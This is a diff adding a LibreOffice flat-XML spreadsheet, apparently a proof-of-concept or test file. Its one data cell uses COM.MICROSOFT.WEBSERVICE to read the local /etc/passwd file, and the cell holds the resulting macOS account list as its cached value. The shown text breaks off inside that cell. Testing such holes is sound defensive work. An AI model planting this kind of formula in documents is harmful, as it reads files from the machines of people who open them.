@@ -1,0 +1,300 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:rpt="http://openoffice.org/2005/report" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:css3t="http://www.w3.org/TR/css3-text/" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
+ <office:meta><meta:generator>LibreOffice/6.0.0.3$MacOSX_X86_64 LibreOffice_project/64a0f66915f38c6217de274f0aa8e15618924765</meta:generator><dc:date>2019-05-21T12:17:35.762431649</dc:date><meta:editing-duration>PT1H15M15S</meta:editing-duration><meta:editing-cycles>15</meta:editing-cycles><meta:document-statistic meta:table-count="1" meta:cell-count="3" meta:object-count="0"/></office:meta>
+ <office:settings>
+  <config:config-item-set config:name="ooo:view-settings">
+   <config:config-item config:name="VisibleAreaTop" config:type="int">0</config:config-item>
+   <config:config-item config:name="VisibleAreaLeft" config:type="int">0</config:config-item>
+   <config:config-item config:name="VisibleAreaWidth" config:type="int">17554</config:config-item>
+   <config:config-item config:name="VisibleAreaHeight" config:type="int">26969</config:config-item>
+   <config:config-item-map-indexed config:name="Views">
+    <config:config-item-map-entry>
+     <config:config-item config:name="ViewId" config:type="string">view1</config:config-item>
+     <config:config-item-map-named config:name="Tables">
+      <config:config-item-map-entry config:name="Sheet1">
+       <config:config-item config:name="CursorPositionX" config:type="int">0</config:config-item>
+       <config:config-item config:name="CursorPositionY" config:type="int">2</config:config-item>
+       <config:config-item config:name="HorizontalSplitMode" config:type="short">0</config:config-item>
+       <config:config-item config:name="VerticalSplitMode" config:type="short">0</config:config-item>
+       <config:config-item config:name="HorizontalSplitPosition" config:type="int">0</config:config-item>
+       <config:config-item config:name="VerticalSplitPosition" config:type="int">0</config:config-item>
+       <config:config-item config:name="ActiveSplitRange" config:type="short">2</config:config-item>
+       <config:config-item config:name="PositionLeft" config:type="int">0</config:config-item>
+       <config:config-item config:name="PositionRight" config:type="int">0</config:config-item>
+       <config:config-item config:name="PositionTop" config:type="int">0</config:config-item>
+       <config:config-item config:name="PositionBottom" config:type="int">1</config:config-item>
+       <config:config-item config:name="ZoomType" config:type="short">0</config:config-item>
+       <config:config-item config:name="ZoomValue" config:type="int">100</config:config-item>
+       <config:config-item config:name="PageViewZoomValue" config:type="int">60</config:config-item>
+       <config:config-item config:name="ShowGrid" config:type="boolean">true</config:config-item>
+       <config:config-item config:name="AnchoredTextOverflowLegacy" config:type="boolean">false</config:config-item>
+      </config:config-item-map-entry>
+     </config:config-item-map-named>
+     <config:config-item config:name="ActiveTable" config:type="string">Sheet1</config:config-item>
+     <config:config-item config:name="HorizontalScrollbarWidth" config:type="int">1282</config:config-item>
+     <config:config-item config:name="ZoomType" config:type="short">0</config:config-item>
+     <config:config-item config:name="ZoomValue" config:type="int">100</config:config-item>
+     <config:config-item config:name="PageViewZoomValue" config:type="int">60</config:config-item>
+     <config:config-item config:name="ShowPageBreakPreview" config:type="boolean">false</config:config-item>
+     <config:config-item config:name="ShowZeroValues" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="ShowNotes" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="ShowGrid" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="GridColor" config:type="long">12632256</config:config-item>
+     <config:config-item config:name="ShowPageBreaks" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="HasColumnRowHeaders" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="HasSheetTabs" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="IsOutlineSymbolsSet" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="IsValueHighlightingEnabled" config:type="boolean">false</config:config-item>
+     <config:config-item config:name="IsSnapToRaster" config:type="boolean">false</config:config-item>
+     <config:config-item config:name="RasterIsVisible" config:type="boolean">false</config:config-item>
+     <config:config-item config:name="RasterResolutionX" config:type="int">1270</config:config-item>
+     <config:config-item config:name="RasterResolutionY" config:type="int">1270</config:config-item>
+     <config:config-item config:name="RasterSubdivisionX" config:type="int">1</config:config-item>
+     <config:config-item config:name="RasterSubdivisionY" config:type="int">1</config:config-item>
+     <config:config-item config:name="IsRasterAxisSynchronized" config:type="boolean">true</config:config-item>
+     <config:config-item config:name="AnchoredTextOverflowLegacy" config:type="boolean">false</config:config-item>
+    </config:config-item-map-entry>
+   </config:config-item-map-indexed>
+  </config:config-item-set>
+  <config:config-item-set config:name="ooo:configuration-settings">
+   <config:config-item config:name="ShowZeroValues" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="IsOutlineSymbolsSet" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="ShowGrid" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="ShowNotes" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="ShowPageBreaks" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="HasSheetTabs" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="IsRasterAxisSynchronized" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="IsSnapToRaster" config:type="boolean">false</config:config-item>
+   <config:config-item config:name="EmbedFonts" config:type="boolean">false</config:config-item>
+   <config:config-item-map-indexed config:name="ForbiddenCharacters">
+    <config:config-item-map-entry>
+     <config:config-item config:name="Language" config:type="string">en</config:config-item>
+     <config:config-item config:name="Country" config:type="string">US</config:config-item>
+     <config:config-item config:name="Variant" config:type="string"/>
+     <config:config-item config:name="BeginLine" config:type="string"/>
+     <config:config-item config:name="EndLine" config:type="string"/>
+    </config:config-item-map-entry>
+   </config:config-item-map-indexed>
+   <config:config-item config:name="PrinterName" config:type="string">FollowMe Printer</config:config-item>
+   <config:config-item config:name="SaveVersionOnClose" config:type="boolean">false</config:config-item>
+   <config:config-item config:name="GridColor" config:type="long">12632256</config:config-item>
+   <config:config-item config:name="RasterIsVisible" config:type="boolean">false</config:config-item>
+   <config:config-item config:name="RasterSubdivisionX" config:type="int">1</config:config-item>
+   <config:config-item config:name="LinkUpdateMode" config:type="short">3</config:config-item>
+   <config:config-item config:name="RasterResolutionY" config:type="int">1270</config:config-item>
+   <config:config-item config:name="HasColumnRowHeaders" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="RasterSubdivisionY" config:type="int">1</config:config-item>
+   <config:config-item config:name="SyntaxStringRef" config:type="short">7</config:config-item>
+   <config:config-item config:name="ApplyUserData" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="AutoCalculate" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="IsKernAsianPunctuation" config:type="boolean">false</config:config-item>
+   <config:config-item config:name="RasterResolutionX" config:type="int">1270</config:config-item>
+   <config:config-item config:name="CharacterCompressionType" config:type="short">0</config:config-item>
+   <config:config-item config:name="IsDocumentShared" config:type="boolean">false</config:config-item>
+   <config:config-item config:name="LoadReadonly" config:type="boolean">false</config:config-item>
+   <config:config-item config:name="UpdateFromTemplate" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="AllowPrintJobCancel" config:type="boolean">true</config:config-item>
+   <config:config-item config:name="PrinterSetup" config:type="base64Binary">5wD+/0ZvbGxvd01lIFByaW50ZXIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAR2VuZXJpYyBQb3N0U2NyaXB0IFByaW50ZXIAAAAAAAAWAAQABAAAAAAAAAAIAFZUAAAkbQAAAAAAABIAQ09NUEFUX0RVUExFWF9NT0RFEwBEdXBsZXhNb2RlOjpVbmtub3du</config:config-item>
+  </config:config-item-set>
+ </office:settings>
+ <office:scripts>
+  <office:script script:language="ooo:Basic">
+   <ooo:libraries xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <ooo:library-embedded ooo:name="Standard"/>
+   </ooo:libraries>
+  </office:script>
+ </office:scripts>
+ <office:font-face-decls>
+  <style:font-face style:name="Liberation Sans" svg:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="swiss" style:font-pitch="variable"/>
+  <style:font-face style:name="Arial Unicode MS" svg:font-family="&apos;Arial Unicode MS&apos;" style:font-family-generic="system" style:font-pitch="variable"/>
+  <style:font-face style:name="Segoe UI" svg:font-family="&apos;Segoe UI&apos;" style:font-family-generic="system" style:font-pitch="variable"/>
+  <style:font-face style:name="Tahoma" svg:font-family="Tahoma" style:font-family-generic="system" style:font-pitch="variable"/>
+ </office:font-face-decls>
+ <office:styles>
+  <style:default-style style:family="table-cell">
+   <style:paragraph-properties style:tab-stop-distance="36pt"/>
+   <style:text-properties style:font-name="Liberation Sans" fo:language="en" fo:country="US" style:font-name-asian="Segoe UI" style:language-asian="zh" style:country-asian="CN" style:font-name-complex="Tahoma" style:language-complex="hi" style:country-complex="IN"/>
+  </style:default-style>
+  <number:number-style style:name="N0">
+   <number:number number:min-integer-digits="1"/>
+  </number:number-style>
+  <style:style style:name="Default" style:family="table-cell">
+   <style:text-properties style:font-name-asian="Arial Unicode MS" style:font-family-asian="&apos;Arial Unicode MS&apos;" style:font-family-generic-asian="system" style:font-pitch-asian="variable" style:font-name-complex="Arial Unicode MS" style:font-family-complex="&apos;Arial Unicode MS&apos;" style:font-family-generic-complex="system" style:font-pitch-complex="variable"/>
+  </style:style>
+  <style:style style:name="Heading" style:family="table-cell" style:parent-style-name="Default">
+   <style:text-properties fo:color="#000000" fo:font-size="24pt" fo:font-style="normal" fo:font-weight="bold"/>
+  </style:style>
+  <style:style style:name="Heading_20_1" style:display-name="Heading 1" style:family="table-cell" style:parent-style-name="Heading">
+   <style:text-properties fo:color="#000000" fo:font-size="18pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Heading_20_2" style:display-name="Heading 2" style:family="table-cell" style:parent-style-name="Heading">
+   <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Text" style:family="table-cell" style:parent-style-name="Default"/>
+  <style:style style:name="Note" style:family="table-cell" style:parent-style-name="Text">
+   <style:table-cell-properties fo:background-color="#ffffcc" style:diagonal-bl-tr="none" style:diagonal-tl-br="none" fo:border="0.74pt solid #808080"/>
+   <style:text-properties fo:color="#333333" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Footnote" style:family="table-cell" style:parent-style-name="Text">
+   <style:text-properties fo:color="#808080" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Hyperlink" style:family="table-cell" style:parent-style-name="Text">
+   <style:text-properties fo:color="#0000ee" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="#0000ee" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Status" style:family="table-cell" style:parent-style-name="Default"/>
+  <style:style style:name="Good" style:family="table-cell" style:parent-style-name="Status">
+   <style:table-cell-properties fo:background-color="#ccffcc"/>
+   <style:text-properties fo:color="#006600" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Neutral" style:family="table-cell" style:parent-style-name="Status">
+   <style:table-cell-properties fo:background-color="#ffffcc"/>
+   <style:text-properties fo:color="#996600" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Bad" style:family="table-cell" style:parent-style-name="Status">
+   <style:table-cell-properties fo:background-color="#ffcccc"/>
+   <style:text-properties fo:color="#cc0000" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Warning" style:family="table-cell" style:parent-style-name="Status">
+   <style:text-properties fo:color="#cc0000" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Error" style:family="table-cell" style:parent-style-name="Status">
+   <style:table-cell-properties fo:background-color="#cc0000"/>
+   <style:text-properties fo:color="#ffffff" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="bold"/>
+  </style:style>
+  <style:style style:name="Accent" style:family="table-cell" style:parent-style-name="Default">
+   <style:text-properties fo:color="#000000" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="bold"/>
+  </style:style>
+  <style:style style:name="Accent_20_1" style:display-name="Accent 1" style:family="table-cell" style:parent-style-name="Accent">
+   <style:table-cell-properties fo:background-color="#000000"/>
+   <style:text-properties fo:color="#ffffff" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Accent_20_2" style:display-name="Accent 2" style:family="table-cell" style:parent-style-name="Accent">
+   <style:table-cell-properties fo:background-color="#808080"/>
+   <style:text-properties fo:color="#ffffff" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
+  </style:style>
+  <style:style style:name="Accent_20_3" style:display-name="Accent 3" style:family="table-cell" style:parent-style-name="Accent">
+   <style:table-cell-properties fo:background-color="#dddddd"/>
+  </style:style>
+ </office:styles>
+ <office:automatic-styles>
+  <style:style style:name="co1" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="497.59pt"/>
+  </style:style>
+  <style:style style:name="co2" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="75.66pt"/>
+  </style:style>
+  <style:style style:name="co3" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="173.14pt"/>
+  </style:style>
+  <style:style style:name="co4" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="64.01pt"/>
+  </style:style>
+  <style:style style:name="co5" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="420.94pt"/>
+  </style:style>
+  <style:style style:name="co6" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="229.49pt"/>
+  </style:style>
+  <style:style style:name="co7" style:family="table-column">
+   <style:table-column-properties fo:break-before="auto" style:column-width="105.19pt"/>
+  </style:style>
+  <style:style style:name="ro1" style:family="table-row">
+   <style:table-row-properties style:row-height="497.34pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
+  </style:style>
+  <style:style style:name="ro2" style:family="table-row">
+   <style:table-row-properties style:row-height="140.4pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
+  </style:style>
+  <style:style style:name="ro3" style:family="table-row">
+   <style:table-row-properties style:row-height="126.74pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
+  </style:style>
+  <style:style style:name="ro4" style:family="table-row">
+   <style:table-row-properties style:row-height="12.81pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
+  </style:style>
+  <style:style style:name="ta1" style:family="table" style:master-page-name="Default">
+   <style:table-properties table:display="true" style:writing-mode="lr-tb"/>
+  </style:style>
+  <style:page-layout style:name="pm1">
+   <style:page-layout-properties style:writing-mode="lr-tb"/>
+   <style:header-style>
+    <style:header-footer-properties fo:min-height="21.26pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-bottom="7.09pt"/>
+   </style:header-style>
+   <style:footer-style>
+    <style:header-footer-properties fo:min-height="21.26pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-top="7.09pt"/>
+   </style:footer-style>
+  </style:page-layout>
+  <style:page-layout style:name="pm2">
+   <style:page-layout-properties style:writing-mode="lr-tb"/>
+   <style:header-style>
+    <style:header-footer-properties fo:min-height="21.26pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-bottom="7.09pt" fo:border="2.49pt solid #000000" fo:padding="0.51pt" fo:background-color="#c0c0c0">
+     <style:background-image/>
+    </style:header-footer-properties>
+   </style:header-style>
+   <style:footer-style>
+    <style:header-footer-properties fo:min-height="21.26pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-top="7.09pt" fo:border="2.49pt solid #000000" fo:padding="0.51pt" fo:background-color="#c0c0c0">
+     <style:background-image/>
+    </style:header-footer-properties>
+   </style:footer-style>
+  </style:page-layout>
+ </office:automatic-styles>
+ <office:master-styles>
+  <style:master-page style:name="Default" style:page-layout-name="pm1">
+   <style:header>
+    <text:p><text:sheet-name>???</text:sheet-name></text:p>
+   </style:header>
+   <style:header-left style:display="false"/>
+   <style:footer>
+    <text:p>Page <text:page-number>1</text:page-number></text:p>
+   </style:footer>
+   <style:footer-left style:display="false"/>
+  </style:master-page>
+  <style:master-page style:name="Report" style:page-layout-name="pm2">
+   <style:header>
+    <style:region-left>
+     <text:p><text:sheet-name>???</text:sheet-name><text:s/>(<text:title>???</text:title>)</text:p>
+    </style:region-left>
+    <style:region-right>
+     <text:p><text:date style:data-style-name="N2" text:date-value="2019-05-21">00/00/0000</text:date>, <text:time style:data-style-name="N2" text:time-value="12:17:29.651515537">00:00:00</text:time></text:p>
+    </style:region-right>
+   </style:header>
+   <style:header-left style:display="false"/>
+   <style:footer>
+    <text:p>Page <text:page-number>1</text:page-number><text:s/>/ <text:page-count>99</text:page-count></text:p>
+   </style:footer>
+   <style:footer-left style:display="false"/>
+  </style:master-page>
+ </office:master-styles>
+ <office:body>
+  <office:spreadsheet>
+   <table:calculation-settings table:automatic-find-labels="false" table:use-regular-expressions="false" table:use-wildcards="true"/>
+   <table:table table:name="Sheet1" table:style-name="ta1">
+    <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co2" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co3" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co4" table:number-columns-repeated="2" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co5" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co4" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co6" table:default-cell-style-name="Default"/>
+    <table:table-column table:style-name="co7" table:default-cell-style-name="Default"/>
+    <table:table-row table:style-name="ro1">
+     <table:table-cell table:formula="of:=COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)" office:value-type="string" office:string-value="##&#x0a;# User Database&#x0a;# &#x0a;# Note that this file is consulted directly only when the system is running&#x0a;# in single-user mode.  At other times this information is provided by&#x0a;# Open Directory.&#x0a;#&#x0a;# See the opendirectoryd(8) man page for additional information about&#x0a;# Open Directory.&#x0a;##&#x0a;nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false&#x0a;root:*:0:0:System Administrator:/var/root:/bin/sh&#x0a;daemon:*:1:1:System Services:/var/root:/usr/bin/false&#x0a;_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico&#x0a;_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false&#x0a;_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false&#x0a;_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false&#x0a;_lp:*:26:26:Printing Services:/var/spool/cups:/usr/bin/false&#x0a;_postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false&#x0a;_scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false&#x0a;_ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false&#x0a;_appstore:*:33:33:Mac App Store Service:/var/empty:/usr/bin/false&#x0a;_mcxalr:*:54:54:MCX AppLaunch:/var/empty:/usr/bin/false&#x0a;_appleevents:*:55:55:AppleEvents Daemon:/var/empty:/usr/bin/false&#x0a;_geod:*:56:56:Geo Services Daemon:/var/db/geod:/usr/bin/false&#x0a;_devdocs:*:59:59:Developer Documentation:/var/empty:/usr/bin/false&#x0a;_sandbox:*:60:60:Seatbelt:/var/empty:/usr/bin/false&#x0a;_mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false&#x0a;_ard:*:67:67:Apple Remote Desktop:/var/empty:/usr/bin/false&#x0a;_www:*:70:70:World Wide Web Server:/Library/WebServer:/usr/bin/false&#x0a;_eppc:*:71:71:Apple Events User:/var/empty:/usr/bin/false&#x0a;_cvs:*:72:72:CVS Server:/var/empty:/usr/bin/false&#x0a;_svn:*:73:73:SVN Server:/var/empty:/usr/bin/false&#x0a;_mysql:*:74:74:MySQL Server:/var/empty:/usr/bin/false&#x0a;_sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false&#x0a;_qtss:*:76:76:QuickTime Streaming Server:/var/empty:/usr/bin/false&#x0a;_cyrus:*:77:6:Cyrus Administrator:/var/imap:/usr/bin/false&#x0a;_mailman:*:78:78:Mailman List Server:/var/empty:/usr/bin/false&#x0a;_appserver:*:79:79:Application Server:/var/empty:/usr/bin/false&#x0a;_clamav:*:82:82:ClamAV Daemon:/var/virusmails:/usr/bin/false&#x0a;_amavisd:*:83:83:AMaViS Daemon:/var/virusmails:/usr/bin/false&#x0a;_jabber:*:84:84:Jabber XMPP Server:/var/empty:/usr/bin/false&#x0a;_appowner:*:87:87:Application Owner:/var/empty:/usr/bin/false&#x0a;_windowserver:*:88:88:WindowServer:/var/empty:/usr/bin/false&#x0a;_spotlight:*:89:89:Spotlight:/var/empty:/usr/bin/false&#x0a;_tokend:*:91:91:Token Daemon:/var/empty:/usr/bin/false&#x0a;_securityagent:*:92:92:SecurityAgent:/var/db/securityagent:/usr/bin/false&#x0a;_calendar:*:93:93:Calendar:/var/empty:/usr/bin/false&#x0a;_teamsserver:*:94:94:TeamsServer:/var/teamsserver:/usr/bin/false&#x0a;_update_sharing:*:95:-2:Update Sharing:/var/empty:/usr/bin/false&#x0a;_installer:*:96:-2:Installer:/var/empty:/usr/bin/false&#x0a;_atsserver:*:97:97:ATS Server:/var/empty:/usr/bin/false&#x0a;_ftp:*:98:-2:FTP Daemon:/var/empty:/usr/bin/false&#x0a;_unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false&#x0a;_softwareupdate:*:200:200:Software Update Service:/var/db/softwareupdate:/usr/bin/false&#x0a;_coreaudiod:*:202:202:Core Audio Daemon:/var/empty:/usr/bin/false&#x0a;_screensaver:*:203:203:Screensaver:/var/empty:/usr/bin/false&#x0a;_locationd:*:205:205:Location Daemon:/var/db/locationd:/usr/bin/false&#x0a;_trustevaluationagent:*:208:208:Trust Evaluation Agent:/var/empty:/usr/bin/false&#x0a;_timezone:*:210:210:AutoTimeZoneDaemon:/var/empty:/usr/bin/false&#x0a;_lda:*:211:211:Local Delivery Agent:/var/empty:/usr/bin/false&#x0a;_cvmsroot:*:212:212:CVMS Root:/var/empty:/usr/bin/false&#x0a;_usbmuxd:*:213:213:iPhone OS Device Helper:/var/db/lockdown:/usr/bin/false&#x0a;_dovecot:*:214:6:Dovecot Administrator:/var/empty:/usr/bin/false&#x0a;_dpaudio:*:215:215:DP Audio:/var/empty:/usr/bin/false&#x0a;_postgres:*:216:216:PostgreSQL Server:/var/empty:/usr/bin/false&#x0a;_krbtgt:*:217:-2:Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false&#x0a;_kadmin_admin:*:218:-2:Kerberos Admin Service:/var/empty:/usr/bin/false&#x0a;_kadmin_changepw:*:219:-2:Kerberos Change Password Service:/var/empty:/usr/bin/false&#x0a;_devicemgr:*:220:220:Device Management Server:/var/empty:/usr/bin/false&#x0a;_webauthserver:*:221:221:Web Auth Server:/var/empty:/usr/bin/false&#x0a;_netbios:*:222:222:NetBIOS:/var/empty:/usr/bin/false&#x0a;_warmd:*:224:224:Warm Daemon:/var/empty:/usr/bin/false&#x0a;_dovenull:*:227:227:Dovecot Authentication:/var/empty:/usr/bin/false&#x0a;_netstatistics:*:228:228:Network Statistics Daemon:/var/empty:/usr/bin/false&#x0a;_avbdeviced:*:229:-2:Ethernet AVB Device Daemon:/var/empty:/usr/bin/false&#x0a;_krb_krbtgt:*:230:-2:Open Directory Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false&#x0a;_krb_kadmin:*:231:-2:Open Directory Kerberos Admin Service:/var/empty:/usr/bin/false&#x0a;_krb_changepw:*:232:-2:Open Directory Kerberos Change Password Service:/var/empty:/usr/bin/false&#x0a;_krb_kerberos:*:233:-2:Open Directory Kerberos:/var/empty:/usr/bin/false&#x0a;_krb_anonymous:*:234:-2:Open Directory Kerberos Anonymous:/var/empty:/usr/bin/false&#x0a;_assetcache:*:235:235:Asset Cache Service:/var/empty:/usr/bin/false&#x0a;_coremediaiod:*:236:236:Core Media IO Daemon:/var/empty:/usr/bin/false&#x0a;_launchservicesd:*:239:239:_launchservicesd:/var/empty:/usr/bin/false&#x0a;_iconservices:*:240:240:IconServices:/var/empty:/usr/bin/false&#x0a;_distnote:*:241:241:DistNote:/var/empty:/usr/bin/false&#x0a;_nsurlsessiond:*:242:242:NSURLSession Daemon:/var/db/nsurlsessiond:/usr/bin/false&#x0a;_nsurlstoraged:*:243:243:NSURLStorage Daemon:/var/db/nsurlstoraged:/usr/bin/false&#x0a;_displaypolicyd:*:244:244:Display Policy Daemon:/var/empty:/usr/bin/false&#x0a;_astris:*:245:245:Astris Services:/var/db/astris:/usr/bin/false&#x0a;_krbfast:*:246:-2:Kerberos FAST Account:/var/empty:/usr/bin/false&#x0a;_gamecontrollerd:*:247:247:Game Controller Daemon:/var/empty:/usr/bin/false&#x0a;_mbsetupuser:*:248:248:Setup User:/var/setup:/bin/bash&#x0a;_ondemand:*:249:249:On Demand Resource Daemon:/var/db/ondemand:/usr/bin/false&#x0a;_xserverdocs:*:251:251:macOS Server Documents Service:/var/empty:/usr/bin/false&#x0a;_wwwproxy:*:252:252:WWW Proxy:/var/empty:/usr/bin/false&#x0a;_mobileasset:*:253:253:MobileAsset User:/var/ma:/usr/bin/false&#x0a;_findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false&#x0a;_datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false&#x0a;_captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false&#x0a;_ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false&#x0a;_applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false&#x0a;_hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false&#x0a;_cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false&#x0a;_analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false&#x0a;_fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false&#x0a;_timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false&#x0a;_reportmemoryexception:*:269:269:ReportMemoryException:/var/db/reportmemoryexception:/usr/bin/false&#x0a;" calcext:value-type="string"><text:p>##</text:p><text:p># User Database</text:p><text:p># </text:p><text:p># Note that this file is consulted directly only when the system is running</text:p><text:p># in single-user mode.  At other times this information is provided by</text:p><text:p># Open Directory.</text:p><text:p>#</text:p><text:p># See the opendirectoryd(8) man page for additional information about</text:p><text:p># Open Directory.</text:p><text:p>##</text:p><text:p>nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false</text:p><text:p>root:*:0:0:System Administrator:/var/root:/bin/sh</text:p><text:p>daemon:*:1:1:System Services:/var/root:/usr/bin/false</text:p><text:p>_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico</text:p><text:p>_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false</text:p><text:p>_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false</text:p><text:p>_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false</text:p><text:p>_lp:*:26:26:Printing 